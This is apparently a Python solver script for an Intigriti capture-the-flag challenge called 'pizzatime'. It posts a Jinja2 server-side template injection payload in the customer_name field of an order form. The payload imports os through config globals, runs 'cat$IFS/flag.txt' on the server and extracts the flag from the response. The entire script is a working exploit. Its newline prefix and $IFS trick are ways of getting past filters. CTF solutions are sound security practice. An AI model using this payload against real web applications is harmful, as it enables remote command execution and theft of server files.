#!/usr/bin/python3
from requests import post
from re import findall


url = "https://pizzatime.ctf.intigriti.io/order"



data = {
    "customer_name": "\n{{config.__class__.from_envvar.__globals__.import_string(\"os\").popen(\"cat$IFS/flag.txt\").read()}}",
    "pizza_name": "Vegetarian",
    "pizza_size": "Medium",
    "topping": "Bacon",
    "sauce": "BBQ",
}


r = post(url, data=data)

flag = findall("INTIGRITI{.*}",r.text)[0]

print(flag)